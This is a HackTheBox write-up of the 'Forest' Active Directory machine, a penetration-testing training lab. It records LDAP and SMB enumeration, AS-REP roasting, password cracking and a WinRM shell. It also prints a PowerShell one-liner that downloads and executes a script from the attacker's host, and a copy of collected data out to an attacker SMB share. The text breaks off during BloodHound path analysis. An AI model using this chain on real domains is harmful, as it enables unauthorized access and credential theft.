# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Forest](https://www.hackthebox.com/machines/Forest)

<img src="https://labs.hackthebox.com/storage/avatars/7dedecb452597150647e73c2dd6c24c7.png" alt="Forest Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy

> Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.

#### Tools Used

- bloodhound
- crackmapexec
- evil-winrm
- impacket-GetNPUsers
- impacket-psexec
- impacket-secretsdump
- impacket-smbserver
- impacket-ticketer
- kerbrute
- john
- ldapsearch
- nmap
- powerview.ps1 (PowerSploit)
- sharphound.ps1

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.7  netmask 255.255.254.0  destination 10.10.16.7 ←
        inet6 dead:beef:4::1005  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::f5af:e019:81f6:82c  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.161`:
```
10.10.10.161 is alive ←
```

`nmap -Pn -sS -sV -p- -T4 10.10.10.161`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 12:42 CEST
Nmap scan report for 10.10.10.161
Host is up (0.094s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-23 11:01:53Z) ←
135/tcp   open  msrpc        Microsoft Windows RPC ←
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn ←
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) ←
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB) ←
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) ←
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49973/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 819.89 seconds
```

`crackmapexec smb 10.10.10.161`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) ←
```

<❌ Failed Step>

`crackmapexec smb 10.10.10.161 -u '' -p '' --shares`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: ←
SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
```

</❌ Failed Step>

`nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.161`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 12:47 CEST
Nmap scan report for FOREST.htb.local (10.10.10.161)
Host is up (0.11s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20241023105446.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local
|       rootDomainNamingContext: DC=htb,DC=local ←
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 15889570
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: FOREST.htb.local ←
|       ldapServiceName: htb.local:forest$@HTB.LOCAL
|       serverName: CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 7 ←
|       forestFunctionality: 7 ←
|_      domainControllerFunctionality: 7 ←
Service Info: Host: FOREST; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
```

`echo -e '10.10.10.161\tFOREST.htb.local FOREST htb.local' | tee -a /etc/hosts`:
```
10.10.10.161    FOREST.htb.local FOREST htb.local ←
```

`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\: 
SMB         10.10.10.161    445    FOREST           [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         Key Distribution Center Service Account
SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 A user account managed by the system.
SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           

[...]

SMB         10.10.10.161    445    FOREST           htb.local\sebastien ←
SMB         10.10.10.161    445    FOREST           htb.local\lucinda ←
SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco ←
SMB         10.10.10.161    445    FOREST           htb.local\andy ←
SMB         10.10.10.161    445    FOREST           htb.local\mark ←
SMB         10.10.10.161    445    FOREST           htb.local\santi ←
```

<🔄 Alternative Step>

`ldapsearch -x -H ldap://10.10.10.161/ -b "DC=htb,DC=local" | grep -E 'userPrincipalName|Service Accounts'`:
```
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.loc
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.loc
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.loc
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB85
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.loc
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.loc
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.loc
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.loc
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
# Managed Service Accounts, htb.local
dn: CN=Managed Service Accounts,DC=htb,DC=local
cn: Managed Service Accounts
distinguishedName: CN=Managed Service Accounts,DC=htb,DC=local
name: Managed Service Accounts
# Service Accounts, htb.local
dn: OU=Service Accounts,DC=htb,DC=local
ou: Service Accounts
distinguishedName: OU=Service Accounts,DC=htb,DC=local
name: Service Accounts
# svc-alfresco, Service Accounts, htb.local ←
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local ←
# Service Accounts, Security Groups, htb.local
dn: CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
userPrincipalName: sebastien@htb.local ←
userPrincipalName: santi@htb.local ←
userPrincipalName: lucinda@htb.local ←
userPrincipalName: andy@htb.local ←
userPrincipalName: mark@htb.local ←
```

</🔄 Alternative Step>

`crackmapexec smb 10.10.10.161 -d 'htb.local' -u '' -p '' --users > ./out.txt`

`cat ./out.txt | tail -n 5 | awk '{print $5}' | cut -d '\' -f2 | tee ./domain_users.txt`:
```
lucinda
svc-alfresco
andy
mark
santi
```

`kerbrute userenum --dc 10.10.10.161 -d 'htb.local' ./domain_users.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/23/24 - Ronnie Flathers @ropnop

2024/10/23 13:32:49 >  Using KDC(s):
2024/10/23 13:32:49 >   10.10.10.161:88

2024/10/23 13:32:49 >  [+] VALID USERNAME:       andy@htb.local ←
2024/10/23 13:32:49 >  [+] VALID USERNAME:       santi@htb.local ←
2024/10/23 13:32:49 >  [+] VALID USERNAME:       mark@htb.local ←
2024/10/23 13:32:49 >  [+] VALID USERNAME:       lucinda@htb.local ←
2024/10/23 13:32:49 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline: ←
$krb5asrep$18$svc-alfresco@HTB.LOCAL:7fd3b4ce858ec556d2a517930b496a42$2fb907468075b4a5f4ce4008a8176a9126eef0563beff3174f96459a74386e118c9f9a321122c9eac36c5e6c144231d7a4f3f5f6b4a319563c495a08b06636abb48d591367a5f407654eecdb98b0a641bb00c2babd6259f47dc19cd2780dc0ada48e50b247e05b37593a73a233810f20f2ba5e03024aff32dcd1fe995244e60df82a46c342637c3be35a1787b093b4527466d619382bc1ff518d0f6d48933007fb46ded59e8792608f42e18d11485564cd862eaa6b823dc26d9d23897600403995ef432668252474b70bec0c8e52f3fd3096b71830be34f98b7fd0729e45e42e58a661ede51753a8558331cf9049f67719017a933f5ee9783321                                                                                              
2024/10/23 13:32:49 >  [+] VALID USERNAME:       svc-alfresco@htb.local ←
2024/10/23 13:32:49 >  Done! Tested 5 usernames (5 valid) in 0.115 seconds ←
```

`vim ./asrep_hash.txt`:
```
$krb5asrep$18$svc-alfresco@HTB.LOCAL:7fd3b4ce858ec556d2a517930b496a42$2fb907468075b4a5f4ce4008a8176a9126eef0563beff3174f96459a74386e118c9f9a321122c9eac36c5e6c144231d7a4f3f5f6b4a319563c495a08b06636abb48d591367a5f407654eecdb98b0a641bb00c2babd6259f47dc19cd2780dc0ada48e50b247e05b37593a73a233810f20f2ba5e03024aff32dcd1fe995244e60df82a46c342637c3be35a1787b093b4527466d619382bc1ff518d0f6d48933007fb46ded59e8792608f42e18d11485564cd862eaa6b823dc26d9d23897600403995ef432668252474b70bec0c8e52f3fd3096b71830be34f98b7fd0729e45e42e58a661ede51753a8558331cf9049f67719017a933f5ee9783321
```

<❌ Failed Step>

`john --wordlist=/usr/share/wordlists/rockyou.txt ./asrep_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:09 DONE (2024-10-23 13:41) 0g/s 1453Kp/s 1453Kc/s 1453KC/s  0841079575..*7¡Vamos!
Session completed. 
```

</❌ Failed Step>

`impacket-GetNPUsers -dc-ip 10.10.10.161 'htb.local/' -usersfile ./domain_users.txt`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:da4a1e13d7834e57d2b4c354155ce107$97c8b39666077204af61bc01aced64ce9097c9089019c6ff16a5f6520afd061209dd2d9d760cdae7cca6389e603790afea6b32f925e7d2bbaae12b20c79aa3902600ead24df467e2e7cd58081f4d9231279f430060d719b3ffa0a41b8f6d3c4fac0ab59e32c39172220879cb3ceaeac247b452b81fbb6e400aa9f5ea74de5ba7dc3dce18c7b86e98e53be3b4748b121c9060d48b53052ba05ef11c4338ddaddf548fb6b854783770150fc1958a262003bd4dd2c272ff3ce4488a9d0112098392ca2f3e06278c6f234d3a86f817395db76c2fba41f13a80f36ca63a4f6358b4b4ed6a03eb3843 ←
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

`vim ./asrep_hash.txt`:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:da4a1e13d7834e57d2b4c354155ce107$97c8b39666077204af61bc01aced64ce9097c9089019c6ff16a5f6520afd061209dd2d9d760cdae7cca6389e603790afea6b32f925e7d2bbaae12b20c79aa3902600ead24df467e2e7cd58081f4d9231279f430060d719b3ffa0a41b8f6d3c4fac0ab59e32c39172220879cb3ceaeac247b452b81fbb6e400aa9f5ea74de5ba7dc3dce18c7b86e98e53be3b4748b121c9060d48b53052ba05ef11c4338ddaddf548fb6b854783770150fc1958a262003bd4dd2c272ff3ce4488a9d0112098392ca2f3e06278c6f234d3a86f817395db76c2fba41f13a80f36ca63a4f6358b4b4ed6a03eb3843
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./asrep_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL) ←
1g 0:00:00:03 DONE (2024-10-23 14:38) 0.2915g/s 1191Kp/s 1191Kc/s 1191KC/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice ←
```

`crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
```

`crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'`:
```
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
HTTP        10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!) ←
```

`evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'`:
```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
htb\svc-alfresco ←
```

`cd C:\Users\svc-alfresco\Desktop`

`dir ./`:
```
    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/23/2024   5:34 AM             34 user.txt
```

`type ./user.txt`:
```
a4314*************************** ←
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators ←                Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users ←          Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cp ~/tools/SharpHound.ps1 ./sh.ps1`

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

`mkdir ./smbshare`

`impacket-smbserver 'smbshare' ./smbshare -smb2support`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)

`cd ../appdata/local/temp`

`mkdir ./a9b7c6d2d1c0f1c8b9e3d8c9a1`

`cd ./a9*`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat ./sh.ps1 | grep "function"`:
```
function Invoke-BloodHound
        for the SharpHound executable and passed in via reflection. The appropriate function
```

`cat ./sh.ps1 | grep "Invoke-BloodHound"`:
```
function Invoke-BloodHound
        PS C:\> Invoke-BloodHound
        PS C:\> Invoke-BloodHound -Loop -LoopInterval 00:01:00 -LoopDuration 00:10:00
        PS C:\> Invoke-BloodHound -CollectionMethods All
        PS C:\> Invoke-BloodHound -CollectionMethods DCOnly -NoSaveCache -RandomizeFilenames -EncryptZip
```

![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)

`powershell.exe -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.7/sh.ps1'); Invoke-BloodHound -CollectionMethods All -Domain 'htb.local' -OutputDirectory ./"`:
```
2024-10-23T07:33:53.3919624-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-23T07:33:53.5481908-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-23T07:33:53.5638346-07:00|INFORMATION|Initializing SharpHound at 7:33 AM on 10/23/2024
2024-10-23T07:33:53.6888071-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-10-23T07:33:53.8294341-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-23T07:33:54.2513086-07:00|INFORMATION|Beginning LDAP search for htb.local
2024-10-23T07:33:54.3138134-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-23T07:33:54.3138134-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-23T07:34:25.2201221-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 89 MB RAM
2024-10-23T07:34:38.8295221-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-23T07:34:38.8607745-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-23T07:34:38.9545254-07:00|INFORMATION|Status: 161 objects finished (+161 3.659091)/s -- Using 140 MB RAM
2024-10-23T07:34:38.9545254-07:00|INFORMATION|Enumeration finished in 00:00:44.7116621
2024-10-23T07:34:39.0326499-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-23T07:34:39.0482747-07:00|INFORMATION|SharpHound Enumeration Completed at 7:34 AM on 10/23/2024! Happy Graphing!
```

`dir ./`:
```
    Directory: C:\Users\svc-alfresco\appdata\local\temp\a9b7c6d2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/23/2024   7:37 AM          18607 20241023073721_BloodHound.zip ←
-a----       10/23/2024   7:37 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```

`copy ./*.zip \\10.10.16.7\smbshare\bh.zip`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/smbshare/bh.zip` > `Clear Finished`

`Search for a node: svc-alfresco` > `SVC-ALFRESCO@HTB.LOCAL` > `<right-click>` > `Mark User as Owned`

`Analysis` > `Shortest Paths` > `Shortest Paths from Owned Principals` > `Select a domain: HTB.LOCAL` > `Select a user: SVC-ALFRESCO@HTB.LOCAL` 

`Analysis` > `Shortest Paths` > `Find Shortest Paths to Domain Admins` > `Select a Domain Admin group: DOMAIN ADMINS@HTB.LOCAL` 

`Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: HTB.LOCAL`

`Graph`:
```
SVC-ALFRESCO ---(MemberOf)--- SERVICE ACCOUNTS ---(MemberOf)--- PRIVILEGED IT ACCOUNTS ---(MemberOf)--- ACCOUNT OPERATORS
```
```
ACCOUNT OPERATORS ---(GenericAll)--- EXCHANGE WINDOWS PERMISSIONS ---(WriteDacl)--- HTB.LOCAL
```
```
HTB.LOCAL ---(DSync)--- DOMAIN ADMINS
```

`GenericAll`:
```
Info:

The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
```
```
Windows Abuse:

Full control of a group allows you to directly modify group membership of the group.

